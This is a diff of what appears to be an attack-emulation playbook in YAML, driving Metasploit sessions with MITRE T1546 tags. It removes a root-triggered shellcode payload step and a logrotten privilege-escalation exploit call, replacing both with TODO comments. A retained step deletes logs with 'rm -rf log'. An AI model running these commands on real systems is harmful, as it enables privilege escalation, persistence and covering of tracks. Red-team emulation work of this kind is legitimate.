@@ -189,13 +189,7 @@ commands:
       tactics: "Privilege Escalation,Persistence"
       technique_name: "Event Triggered Execution"
 
-  - type: msf-session
-    cmd: echo "if [ \`id -u\` -eq 0 ]; then \$( {{shellcode3333.stdout}} | sh ); fi" > payload
-    session: "foothold"
-    metadata:
-      techniques: "T1546"
-      tactics: "Privilege Escalation,Persistence"
-      technique_name: "Event Triggered Execution"
+  # TODO: Implement privilege escalation
 
   - type: msf-session
     cmd: "rm -rf log"
@@ -222,20 +216,7 @@ commands:
       technique_name: "Event Triggered Execution"
 
 
-  - type: msf-session
-    cmd: "/tmp/logrotten -p /var/www/default/payload /var/www/default/log/accesss.log"
-    session: "foothold"
-    metadata:
-      techniques: "T1546"
-      tactics: "Privilege Escalation,Persistence"
-      technique_name: "Event Triggered Execution"
-
-  - type: sleep
-    seconds: 960
-    metadata:
-      techniques: "T1546"
-      tactics: "Privilege Escalation,Persistence"
-      technique_name: "Event Triggered Execution"
+  # TODO: Implement privilege escalation
 
   - type: msf-session
     cmd: "id"
